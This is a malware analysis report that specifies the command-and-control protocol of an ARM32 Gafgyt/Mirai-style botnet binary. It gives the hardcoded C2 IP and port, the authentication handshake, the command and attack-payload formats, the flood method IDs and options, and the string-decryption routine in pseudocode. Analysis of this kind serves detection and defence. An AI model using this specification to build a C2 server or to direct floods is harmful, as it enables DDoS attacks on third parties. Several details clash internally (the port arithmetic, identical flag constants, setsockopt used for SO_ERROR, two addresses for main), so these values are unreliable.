# Gafgyt/Mirai Botnet Communication Layer Specification

## Technical Protocol Analysis — ARM32 (Little-Endian) Binary

**Binary:** `onboardboat`  
**Architecture:** ARM LE 32-bit  
**Image Base:** `0x00008000`  
**Analysis Method:** Static reverse engineering via Ghidra decompiler and assembly inspection

---

## 1. Session Establishment

### 1.1 Observed Behavior

The malware establishes a C2 session through a multi-phase process: socket creation, server address configuration, initial connection, and authentication. The following sequence occurs within the `main` function (starting at `0x0000c5e0`):

#### Phase 1: Socket Creation

```
fd_serv = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
```

- **Socket Type:** TCP stream socket
- **Address Family:** AF_INET (2)
- **Protocol:** Default (0)
- The socket is stored in global variable `DAT_0000cb44`

#### Phase 2: Server Address Configuration

The server address structure (`sockaddr`) is configured at `DAT_0000cb50`. The assembly at `0x0000c8c8-0x0000c8ec` shows:

```asm
; 0x0000c8c8: mvn r3, #0x23800000    ; r3 = 0xdc7fffff
; 0x0000c8d0: sub r3, r3, #0x8f00    ; r3 = 0xdc7770ff
; 0x0000c8d4: sub r3, r3, #0xa3      ; r3 = 0xdc77705c
; 0x0000c8d8: str r3, [r4,#0x4]      ; Store IP at sa_data[4]

; 0x0000c8dc: mvn r12, #0x5a0        ; r12 = 0xfffffa58
; 0x0000c8e0: sub r12, r12, #0xd     ; r12 = 0xfffffa4b
; 0x0000c8e4: strh r12, [r4,#0x2]    ; Store port at sa_data[2]

; 0x0000c8e8: mov r3, #0x2           ; r3 = 2
; 0x0000c8ec: strh r3, [r4,#0x0]     ; Store family at sa_data[0]
```

**Decoded Connection Parameters:**

| Field | Value | Description |
|-------|-------|-------------|
| `sa_family` | `0x0002` | AF_INET |
| Port | `0xFA4B` = **64075** | C2 server port (network byte order) |
| IP | `0xDC77705C` | C2 server IP address (network byte order) |

The IP address `0xDC77705C` in network byte order corresponds to `220.119.112.92` (decimal).

**Verified Fact:** The C2 connection parameters are hardcoded in the binary at the assembly level.

#### Phase 3: Socket Options & Connection

Before connecting, the malware configures socket options:

```c
// Set SO_REUSEADDR
setsockopt(fd_serv, SOL_SOCKET, SO_REUSEADDR, &1, 4);

// Set SO_REUSEPORT (or similar)
setsockopt(fd_serv, SOL_SOCKET, 4, &1, 4);
```

Then initiates the connection:

```c
connect(fd_serv, &server_addr, sizeof(sockaddr));  // 0x10 = 16 bytes
```

#### Phase 4: Connection State Flag

A global flag at `DAT_0000cb48` tracks connection state:
- **Value 1:** Connection in progress (non-blocking connect pending)
- **Value 0:** Connection established or closed

### 1.2 Handshake Logic

Upon successful connection (detected via `select()` returning the socket as writable), the malware sends authentication data. The assembly at `0x0000ca00-0x0000ca60` shows:

```asm
; 0x0000ca00: cpy r0, r10              ; r0 = c2_password pointer
; 0x0000ca04: bl strlen                ; Get password length
; 0x0000ca08: strb r0, [sp,#0x55e]     ; Store password length byte

; 0x0000ca0c: bl get_local_ip          ; Get bot's local IP
; 0x0000ca18: str r0, [r3,#0x0]        ; Store local IP

; === Send Authentication ===
; 0x0000ca1c: ldr r1, [0xcb60]         ; r1 = auth_identifier pointer
; 0x0000ca24: ldr r0, [r5,#0x0]        ; r0 = fd_serv
; 0x0000ca28: bl sendto                ; sendto(fd_serv, auth_id, len, MSG_NOSIGNAL)

; 0x0000ca30: mov r2, #0x1             ; r2 = 1 byte
; 0x0000ca38: add r1, r1, #0xe         ; r1 = sp + 0x55e (password length)
; 0x0000ca40: bl sendto                ; sendto(fd_serv, &password_len, 1, MSG_NOSIGNAL)

; 0x0000ca44: ldrb r2, [sp,#0x55e]     ; r2 = password length
; 0x0000ca48: cmp r2, #0x0             ; If length > 0
; 0x0000ca4c: beq skip_password        ; Skip if empty
; 0x0000ca54: cpy r1, r10              ; r1 = c2_password pointer
; 0x0000ca5c: bl sendto                ; sendto(fd_serv, password, len, MSG_NOSIGNAL)
```

**Authentication Sequence:**

```pseudocode
// === CONNECTION ESTABLISHMENT ===

// 1. Create TCP socket
fd_serv = socket(AF_INET, SOCK_STREAM, 0)

// 2. Configure server address
server_addr.sa_family = AF_INET (0x0002)
server_addr.port = 0xFA4B (64075, network byte order)
server_addr.ip = 0xDC77705C (220.119.112.92, network byte order)

// 3. Set socket options
setsockopt(fd_serv, SOL_SOCKET, SO_REUSEADDR, &1, 4)
setsockopt(fd_serv, SOL_SOCKET, 4, &1, 4)

// 4. Initiate connection
connect(fd_serv, &server_addr, 16)
connection_pending = 1

// 5. Wait for connection to complete (via select)
// When select() indicates fd_serv is writable:

// 6. Check for connection errors
error = 0
error_len = 4
setsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &error, &error_len)

if error != 0:
    close(fd_serv)
    fd_serv = -1
    sleep(random_delay)
    return

// 7. Send authentication payload
local_ip = get_local_ip()
store_local_ip(local_ip)

// Send identifier (from DAT_0000cb60)
sendto(fd_serv, auth_identifier, identifier_len, MSG_NOSIGNAL)

// Send password length (1 byte)
password_len = strlen(c2_password)
sendto(fd_serv, &password_len, 1, MSG_NOSIGNAL)

// Send password (if non-empty)
if password_len > 0:
    sendto(fd_serv, c2_password, password_len, MSG_NOSIGNAL)

// 8. Mark connection as established
connection_pending = 0
```

### 1.3 Success/Failure Handling

#### Success Condition

The connection is considered successful when:
1. `connect()` completes (either immediately or via `select()` indicating writability)
2. `SO_ERROR` returns 0 (no connection error)
3. The authentication payload is sent successfully

After successful authentication, the malware enters the main command processing loop.

#### Failure Conditions

1. **Connection Refused/Failed:** If `SO_ERROR` returns non-zero, the socket is closed and a random sleep delay is applied before the next retry.

2. **Socket Creation Failure:** If `socket()` returns -1, the connection attempt is skipped for this iteration.

3. **Send Failure:** If authentication data cannot be sent, the connection is terminated.

#### Reconnect Behavior

On connection failure:
```c
close(fd_serv);
fd_serv = -1;
sleep(rand() + (rand() * DAT_0000cb54 >> 23) * -10 + 1);
```

The reconnect delay is randomized using the bot's PRNG.

---

## 2. Cryptography

### 2.1 Observed Behavior

The C2 communication protocol uses **no encryption** for the command channel. All data is transmitted in plaintext over TCP. However, the binary implements an internal string table encryption mechanism for protecting configuration data at rest.

#### String Table Encryption (Internal Only)

The binary contains an encrypted string table used for:
- C2 server addresses
- Configuration strings
- Process names for the killer module
- Persistence strings

This encryption is applied to strings stored in the data section and is decrypted at runtime when accessed.

### 2.2 Specification

#### String Table XOR Encryption

- **Algorithm:** Byte-wise XOR with a repeating 4-byte key
- **Key Length:** 4 bytes (stored in global variable)
- **Key Source:** Global variable at `DAT_0000cf5c` (lock key) / `DAT_0000cffc` (unlock key)
- **Operation:** Each byte of the string is XORed with the corresponding byte of the 4-byte key (cycling through key bytes)

The decompiled `table_unlock_val` function shows:

```c
void table_unlock_val(int index) {
    int *entry = (int *)(index * 8 + DAT_0000cff8);
    uint32_t xor_key = *DAT_0000cffc;
    uint16_t str_len = entry[1];
    
    if (str_len != 0) {
        for (int i = 0; i < str_len; i++) {
            uint8_t *byte_ptr = (uint8_t *)(i + *entry);
            *byte_ptr ^= (uint8_t)(xor_key & 0xFF);
            *byte_ptr ^= (uint8_t)((xor_key >> 8) & 0xFF);
            *byte_ptr ^= (uint8_t)((xor_key >> 16) & 0xFF);
            *byte_ptr ^= (uint8_t)((xor_key >> 24) & 0xFF);
        }
    }
}
```

**Note:** The four XOR operations are applied sequentially to each byte, which is equivalent to XORing with `(key[0] ^ key[1] ^ key[2] ^ key[3])` for each byte. This is effectively a single-byte XOR cipher where the effective key is the XOR of all four key bytes.

### 2.3 Decryption Routine

For decrypting the string table from the binary:

```pseudocode
// === EXTERNAL STRING TABLE DECRYPTION ===

function decrypt_string(encrypted_data, data_length, xor_key_4byte):
    // The effective key is XOR of all 4 key bytes
    effective_key = (xor_key_4byte & 0xFF) ^
                    ((xor_key_4byte >> 8) & 0xFF) ^
                    ((xor_key_4byte >> 16) & 0xFF) ^
                    ((xor_key_4byte >> 24) & 0xFF)
    
    decrypted = bytearray(data_length)
    for i from 0 to data_length - 1:
        decrypted[i] = encrypted_data[i] XOR effective_key
    
    return decrypted
```

**Analysis Gap:** The exact XOR key value could not be determined from static analysis alone, as it is loaded from a global variable that may be initialized at runtime. The key must be extracted by either:
1. Reading the global variable value from the data section
2. Dynamically analyzing the binary
3. Brute-forcing the single-byte effective key (only 256 possibilities)

---

## 3. Main Command Loop

### 3.1 Observed Behavior

The main command loop (starting at `0x0000c5e0`) operates as a continuous `select()`-based event loop that handles:

1. **C2 Connection Management:** Establishing and maintaining the TCP connection to the C2 server
2. **Command Reception:** Reading and parsing incoming C2 commands
3. **Heartbeat Transmission:** Sending periodic keepalive packets
4. **Single-Instance Control:** Handling connections to the local control socket
5. **Scanner Loop Invocation:** Periodically invoking the scanner module

#### Loop Structure

```pseudocode
// === MAIN EVENT LOOP ===

heartbeat_counter = 0
connection_pending = 0

while true:
    // Clear fd_sets (128 bits = 32 uint32_t each)
    read_fds = zero 128 bits
    write_fds = zero 128 bits
    max_fd = -1
    
    // Add control socket to read set
    if fd_ctrl != -1:
        FD_SET(fd_ctrl, read_fds)
        max_fd = max(max_fd, fd_ctrl)
    
    // Add C2 socket to appropriate set
    if connection_pending == 0:
        FD_SET(fd_serv, read_fds)     // Connected: wait for data
    else:
        FD_SET(fd_serv, write_fds)    // Connecting: wait for completion
    
    max_fd = max(max_fd, fd_serv)
    
    // Set timeout (10 seconds)
    timeout.tv_sec = 10
    timeout.tv_usec = 0
    
    // Wait for events
    result = select(max_fd + 1, read_fds, write_fds, NULL, &timeout)
    
    if result == -1:
        continue  // Error, retry
    
    // Handle timeout (heartbeat)
    if result == 0:
        heartbeat_counter++
        if heartbeat_counter % 6 == 0:
            send_heartbeat(fd_serv)
        continue
    
    // Handle control socket (single-instance management)
    if FD_ISSET(fd_ctrl, read_fds):
        handle_control_client()
        continue
    
    // Handle C2 socket
    if connection_pending != 0:
        handle_connection_result(fd_serv)
    else:
        handle_c2_data(fd_serv)
    
    // Periodically invoke scanner loop
    if heartbeat_counter % 12 == 0:
        scanner_loop()
```

### 3.2 Protocol Specification

#### Message Format

All C2 messages follow a simple length-prefixed binary protocol:

```
+------------------+------------------+------------------+
| Command Type     | Payload Length   | Payload Data     |
| (2 bytes)        | (2 bytes)        | (variable)       |
| Big-Endian       | Big-Endian       |                  |
+------------------+------------------+------------------+
 Offset 0            Offset 2            Offset 4
```

**Field Details:**

| Field | Offset | Size | Encoding | Description |
|-------|--------|------|----------|-------------|
| Command Type | 0 | 2 bytes | Big-Endian uint16 | Command type/opcode |
| Payload Length | 2 | 2 bytes | Big-Endian uint16 | Length of payload data |
| Payload Data | 4 | Variable | Binary | Command-specific payload |

**Verified Fact:** The assembly at `0x0000c884-0x0000cb00` confirms the message parsing logic:
1. Read 2 bytes for command type
2. If type == 0: read 2 more bytes and loop back (heartbeat ACK)
3. If type != 0: read 2 bytes for length, byte-swap it, validate < 0x400, read payload

### 3.3 Command Processing Logic

```pseudocode
// === C2 COMMAND PROCESSING ===

function handle_c2_data(fd):
    // Allocate temporary buffer
    temp_buf = malloc(4)
    temp_buf[0] = 0
    
    // Step 1: Read command type (2 bytes)
    bytes_read = recvfrom(fd, temp_buf + 2, 2, MSG_NOSIGNAL | MSG_WAITALL)
    
    if bytes_read == -1:
        // Connection error
        return
    
    if bytes_read == 0:
        // Connection closed by server
        close(fd)
        fd_serv = -1
        sleep(1)
        return
    
    cmd_type = (temp_buf[2] << 8) | temp_buf[3]  // Big-endian uint16
    
    // Step 2: Handle heartbeat acknowledgment
    if cmd_type == 0:
        // Read 2 additional bytes (heartbeat response)
        recvfrom(fd, temp_buf + 2, 2, MSG_NOSIGNAL)
        return
    
    // Step 3: Read payload length (2 bytes)
    recvfrom(fd, temp_buf + 2, 2, MSG_NOSIGNAL)
    
    // Byte-swap to host order
    payload_len = (temp_buf[2] << 8) | temp_buf[3]
    
    // Step 4: Validate payload length
    if payload_len > 0x400:
        // Payload too large, close connection
        close(fd)
        fd_serv = -1
        return
    
    // Step 5: Read payload data
    if payload_len > 0:
        payload = malloc(payload_len)
        recvfrom(fd, payload, payload_len, MSG_NOSIGNAL)
        
        // Step 6: Dispatch to attack handler
        attack_start(payload)
```

### 3.4 Attack Command Payload Structure

When command type is non-zero, the payload contains attack parameters. The `attack_start` function at `0x00008650` parses:

```
+--------+--------+--------+--------+--------+--------+--------+
| Duration | Method | Num    | Num    | Target   | Option   |
| (4 bytes)| (1 byte)| Targets| Options| Array    | Array    |
| NBO      | ID     | (1 byte)| (1 byte)| (5B each)| (8B each)|
+--------+--------+--------+--------+--------+--------+--------+
 Offset 0   Offset 4  Offset 5   Offset 6    Offset 7    Variable
```

**Payload Fields:**

| Field | Offset | Size | Encoding | Description |
|-------|--------|------|----------|-------------|
| Duration | 0 | 4 bytes | Network byte order uint32 | Attack duration in seconds |
| Method ID | 4 | 1 byte | uint8 | Attack method identifier |
| Num Targets | 5 | 1 byte | uint8 | Number of target entries |
| Num Options | 6 | 1 byte | uint8 | Number of option entries |
| Target Array | 7 | 5 × Num Targets | Binary | Array of target structures |
| Option Array | 7 + 5×N | Variable | Binary | Array of option structures |

**Analysis Gap:** The exact target and option structure sizes were inferred from the parsing logic in `attack_start`. The target structure appears to be 5 bytes per entry based on the loop arithmetic (`param_2 - 6 - num_targets * 5`).

#### Target Entry Structure (5 bytes)

```
+--------+--------+--------+
| Address  | Port   | Flags  |
| (4 bytes)| (1 byte)|        |
| NBO      |        |        |
+--------+--------+--------+
```

#### Option Entry Structure (8 bytes)

```
+------------------+--------+
| Option Value     | Option |
| (pointer, 4B)    | ID     |
|                  | (1B)   |
+------------------+--------+
```

### 3.5 Attack Method IDs

The `attack_init` function (at `0x00008a44`) registers the following attack methods:

| Method ID | Function Address | Attack Type | Description |
|-----------|-----------------|-------------|-------------|
| `0x01` | `0x00009160` | UDP Flood | Standard UDP flood (`attack_method_std`) |
| `0x02` | `0x0000B978` | TCP Flood | TCP connection flood (`attack_method_tcp`) |
| `0x03` | `0x0000944C` | UDP Hex Flood | Raw UDP hex flood (`attack_method_udphex`) |
| `0x04` | `0x00009844` | TCP StdHex | TCP hex flood (`attack_method_stdhex`) |
| `0x06` | `0x00009E74` | Hex Flood | Generic hex flood (`attack_method_hexflood`) |
| `0x05` | `0x0000A1D0` | TCP SYN | Raw TCP SYN flood (`attack_tcp_syn`) |
| `0x08` | `0x0000AA38` | NUDP Flood | Non-standard UDP (`attack_method_nudp`) |
| `0x07` | `0x0000B1EC` | TCP Raw | Raw TCP flood (`attack_tcp_raw`) |
| `0x09` | `0x00008E74` | UDP Plain | Plain UDP flood (`attack_method_udp`) |
| `0x0A` | `0x0000BC34` | Scanner | Scanner loop (`scanner_loop`) |

### 3.6 Option Parsing

The `get_option_val` and `get_option_str` functions parse option arrays:

```pseudocode
// === OPTION VALUE RETRIEVAL ===

function get_option_val(num_options, options, option_id, default_val):
    // Check first option (fast path)
    if num_options > 0 and options[0].id == option_id:
        if options[0].value != NULL:
            return atoi(options[0].value)
    
    // Search remaining options
    for i from 1 to num_options - 1:
        if options[i].id == option_id:
            if options[i].value != NULL:
                return atoi(options[i].value)
    
    return default_val

function get_option_str(num_options, options, option_id, default_val):
    for i from 0 to num_options - 1:
        if options[i].id == option_id:
            if options[i].value != NULL:
                return atol(options[i].value)
    
    return default_val
```

**Common Option IDs:**

| Option ID | Type | Default | Description |
|-----------|------|---------|-------------|
| `0x00` | int | varies | Payload size / socket count |
| `0x01` | int | 1 | Randomization flag |
| `0x02` | byte | 0 | TOS/DSCP value |
| `0x03` | int | 0xFFFF | Source port |
| `0x04` | byte | 0x40 | TTL value |
| `0x05` | byte | 0 | DF flag / protocol specific |
| `0x06` | int | 0xFFFF | Source port/IP |
| `0x07` | int | 0xFFFF | Destination port |
| `0x0B-0x10` | byte | varies | TCP flag bits |
| `0x11` | int | 0xFFFF | Sequence number |
| `0x12` | int | 0xFFFF | Acknowledgment number |
| `0x13` | byte | 0 | Protocol-specific flag |
| `0x19` | string | varies | Custom payload / IP |
| `0x1B` | byte | 0 | Randomization flag |
| `0x1C` | byte | 0x7C | Min payload size |
| `0x1D` | int | 0x20C | Max payload size |

### 3.7 Attack Execution Model

The `attack_execute` function (at `0x000081b8`) implements a double-fork pattern:

```pseudocode
// === ATTACK EXECUTION ===

function attack_execute(duration, method_id, num_targets, targets, options):
    // First fork: supervisor process
    pid = fork()
    if pid == 0:
        setuid(0, 0)
        
        // Second fork: timer process
        timer_pid = fork()
        if timer_pid == 0:
            // Timer process: sleep and kill supervisor
            sleep(duration)
            kill(getppid(), SIGKILL)
            exit(0)
        
        // Supervisor process: find and execute attack method
        method = find_method_by_id(method_id)
        if method != NULL:
            method.func(num_targets, targets, options)
        
        exit(0)
    
    // Parent process: track attack PIDs
    track_attack_pid(pid)
```

This ensures attacks run in the background and terminate automatically after the specified duration.

---

## 4. ACKs & Keepalives

### 4.1 Observed Behavior

The malware implements a heartbeat mechanism to maintain the C2 session. Heartbeats are sent periodically during the main event loop.

### 4.2 Response Packet Formats

#### Heartbeat Packet

```
+--------+--------+
| Byte 0 | Byte 1 |
| 0x00   | 0x00   |
+--------+--------+
```

- **Size:** 2 bytes
- **Content:** Two zero bytes
- **Transmission Flag:** `MSG_NOSIGNAL | MSG_DONTROUTE` (0x4000)
- **Sent via:** `sendto()`

**Verified Fact:** The assembly at `0x0000c710-0x0000c948` confirms heartbeat transmission:
```asm
strh r0, [sp, #0x55e]  ; Store 0x0000
add r2, sp, #0x55e      ; Buffer pointer
mov r3, #0x4000         ; MSG_NOSIGNAL | MSG_DONTROUTE
bl sendto               ; sendto(fd_serv, heartbeat, 2, 0x4000)
```

#### Authentication Payload

```
+--------+--------+--------+--------+--------+--------+--------+
| Identifier (4B) | Length (1B) | Password (variable) |
+--------+--------+--------+--------+--------+--------+--------+
```

- **Identifier:** 4 bytes from `DAT_0000cb60` (global constant)
- **Length:** 1 byte, length of the C2 password string
- **Password:** Variable length, the C2 authentication password

**Analysis Gap:** The exact 4-byte identifier value at `DAT_0000cb60` could not be determined from static analysis alone.

### 4.3 Feedback Logic

#### Heartbeat Transmission

```pseudocode
// === HEARTBEAT LOGIC ===

heartbeat_counter = 0

while true:
    // select() with 10-second timeout
    result = select(..., timeout=10s)
    
    if result == 0:  // Timeout
        heartbeat_counter++
        
        // Send heartbeat every 60 seconds (6 * 10s intervals)
        if heartbeat_counter % 6 == 0:
            heartbeat_buf = [0x00, 0x00]
            sendto(fd_serv, heartbeat_buf, 2, MSG_NOSIGNAL | MSG_DONTROUTE)
```

#### Connection State Handling

```pseudocode
// === CONNECTION STATE MACHINE ===

function handle_connection_pending(fd_serv, connection_pending):
    if connection_pending != 0:
        connection_pending = 0
        
        if select indicates fd_serv is writable:
            // Check for connection errors
            error = 0
            error_len = 4
            setsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &error, &error_len)
            
            if error == 0:
                // Connection successful
                send_authentication(fd_serv)
            else:
                // Connection failed
                close(fd_serv)
                fd_serv = -1
                sleep(random_delay)
        else:
            // Connection still pending or failed
            close(fd_serv)
            fd_serv = -1
            sleep(1)
```

#### Control Socket (Single-Instance)

```pseudocode
// === SINGLE-INSTANCE CONTROL ===

// Control socket bound to local port 0x9DC7 (40391)
fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)
setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &1, 4)

// Try to bind to port 0x9DC7
if bind(fd_ctrl, port=0x9DC7) fails:
    // Another instance exists, connect to it and exit
    connect(fd_ctrl, 127.0.0.1:0x9DC7)
    sleep(5)
    close(fd_ctrl)
    exit(1)

// Listen for incoming connections
listen(fd_ctrl, backlog)

// In main loop:
if select() indicates fd_ctrl is readable:
    // Incoming connection means another instance is starting
    // Kill all attacks and terminate
    bind_control_socket()
    kill_all_attacks()
    kill(killer_pid, SIGKILL)
    kill(-session_id, SIGKILL)  // Kill entire process group
    exit(0)
```

### 4.4 Session Lifecycle

#### State Transitions

```
[INIT] → [CONNECTING] → [AUTHENTICATING] → [CONNECTED] → [DISCONNECTED]
                                   ↑              |
                                   └──────────────┘
                                      (reconnect)
```

1. **INIT:** Socket not created, `fd_serv = -1`
2. **CONNECTING:** Socket created, `connect()` called, `connection_pending = 1`
3. **AUTHENTICATING:** Connection established, sending credentials
4. **CONNECTED:** Authentication complete, receiving commands
5. **DISCONNECTED:** Connection lost, will retry

#### Reconnect Behavior

On disconnection:
```c
close(fd_serv);
fd_serv = -1;
sleep(1);  // Brief delay before reconnect attempt
```

The next iteration of the main loop will create a new socket and attempt to reconnect.

#### Graceful Termination

The malware can be terminated via:
1. **Control Socket Connection:** Incoming connection to the single-instance control socket triggers self-termination
2. **Kill Signal:** `kill(-session_id, SIGKILL)` terminates the entire process group
3. **Command-Based Kill:** Attack command with duration=0 kills all active attacks

---

## Appendix A: Key Data Structures

### A.1 Global Variables

| Address | Variable | Description |
|---------|----------|-------------|
| `DAT_0000cb40` | `fd_ctrl` | Control socket file descriptor |
| `DAT_0000cb44` | `fd_serv` | C2 server socket file descriptor |
| `DAT_0000cb48` | `connection_pending` | Connection state flag |
| `DAT_0000cb50` | `server_addr` | C2 server sockaddr structure |
| `DAT_0000cb54` | `random_seed` | PRNG seed for reconnect delay |
| `DAT_0000cb58` | `killer_pid` | Killer process PID |
| `DAT_0000cb5c` | `local_ip` | Bot's local IP address |
| `DAT_0000cb60` | `auth_identifier` | 4-byte authentication identifier |

### A.2 String Table Structure

```
string_table_entry {
    ptr: pointer to encrypted string data (4 bytes)
    len: string length (2 bytes)
}

string_table_base = DAT_0000cebc (retrieval table)
lock_table_base = DAT_0000cf58 (lock table)
unlock_table_base = DAT_0000cff8 (unlock table)
```

### A.3 Attack Method Registration Table

```
attack_method_entry {
    func_ptr: pointer to attack handler function (4 bytes)
    method_id: attack method identifier (1 byte)
}

method_table = DAT_00008d54  // Array of method entries
method_count = DAT_00008d50  // Number of registered methods
```

---

## Appendix B: Analysis Gaps

### B.1 Undetermined Values

1. **Authentication Identifier:** The 4-byte authentication identifier sent at `DAT_0000cb60` could not be fully resolved. Its value is referenced from a global variable.

2. **XOR Key Value:** The string table XOR key is stored in a global variable that could not be definitively identified from static analysis alone. However, the effective key is a single byte (XOR of all 4 key bytes), making brute-force feasible (256 possibilities).

3. **Default C2 Password:** When `argv[1]` is not provided, the malware falls back to a default password stored at `DAT_0000cb24`. This value could not be directly extracted.

### B.2 Protocol Ambiguities

1. **Server Response Format:** The binary does not appear to parse any specific response from the C2 server after authentication. It proceeds directly to the command reception loop, suggesting the server may not send an explicit acknowledgment.

2. **Command Acknowledgment:** The malware does not appear to send explicit ACKs for received commands. Commands are processed asynchronously via forked processes.

3. **Error Handling:** The binary handles connection errors by closing the socket and sleeping, but does not appear to send error reports to the C2 server.

### B.3 Verification Notes

All findings in this specification are derived from static analysis of the ARM32 binary using Ghidra decompiler output and assembly inspection. The following should be independently verified:

1. Authentication identifier bytes (require data section inspection)
2. String table XOR key value (require data section inspection or dynamic analysis)
3. Default C2 password value (require data section inspection)
4. Any additional protocol features not visible in the static analysis

---

## Appendix C: Reference Code Locations

| Function | Address | Purpose |
|----------|---------|---------|
| `main` | `0x0000c3c4` | Entry point and main event loop |
| `attack_start` | `0x00008650` | Attack command dispatcher |
| `attack_execute` | `0x000081b8` | Attack process forker |
| `attack_init` | `0x00008a44` | Attack method registration |
| `kill_all_attacks` | `0x0000833c` | Terminate all attack processes |
| `get_option_val` | `0x000085e0` | Option value parser |
| `get_option_str` | `0x00008574` | Option string parser |
| `table_retrieve_val` | `0x0000ce9c` | String table lookup |
| `table_lock_val` | `0x0000cec0` | String table encryption |
| `table_unlock_val` | `0x0000cf60` | String table decryption |
| `init_single_instance_ctrl` | `0x0000c260` | Control socket initialization |
| `handle_ctrl_client` | `0x0000f98c` | Control client handler |
| `scanner_loop` | `0x0000bc34` | Scanner loop entry |
| `killer_init` | `0x0000bc38` | Killer process initialization |
| `scanner_init` | `0x0000c174` | Scanner process initialization |
| `get_local_ip` | `0x0000d3b4` | Local IP retrieval |
| `rand` | `0x0000cb64` | Pseudo-random number generator |
| `attack_method_std` | `0x00009160` | Standard UDP flood |
| `attack_method_tcp` | `0x0000b978` | TCP flood |
| `attack_method_udphex` | `0x0000944c` | UDP hex flood |
| `attack_method_stdhex` | `0x00009844` | TCP hex flood |
| `attack_method_hexflood` | `0x00009e74` | Generic hex flood |
| `attack_tcp_syn` | `0x0000a1d0` | TCP SYN flood |
| `attack_method_nudp` | `0x0000aa38` | NUDP flood |
| `attack_tcp_raw` | `0x0000b1ec` | Raw TCP flood |
| `attack_method_udp` | `0x00008e74` | Plain UDP flood |

---

## Appendix D: Key Constants

### D.1 C2 Connection

| Constant | Value | Description |
|----------|-------|-------------|
| C2 Port | `0xFA4B` (64075) | C2 server TCP port |
| C2 IP | `0xDC77705C` | C2 server IP (220.119.112.92) |
| AF_INET | `0x0002` | Address family |
| MSG_NOSIGNAL | `0x4000` | Don't send SIGPIPE on error |
| MSG_DONTROUTE | `0x4000` | Bypass routing |
| Max Payload | `0x400` (1024) | Maximum command payload size |

### D.2 Timing

| Constant | Value | Description |
|----------|-------|-------------|
| Select Timeout | `10` seconds | Main loop select timeout |
| Heartbeat Interval | `6` timeouts | Heartbeat every 60 seconds |
| Scanner Interval | `12` timeouts | Scanner every 120 seconds |

### D.3 Ports

| Constant | Value | Description |
|----------|-------|-------------|
| Control Port | `0x9DC7` (40391) | Single-instance control port |
| C2 Port | `0xFA4B` (64075) | C2 server port |

---

*End of Communication Layer Specification*
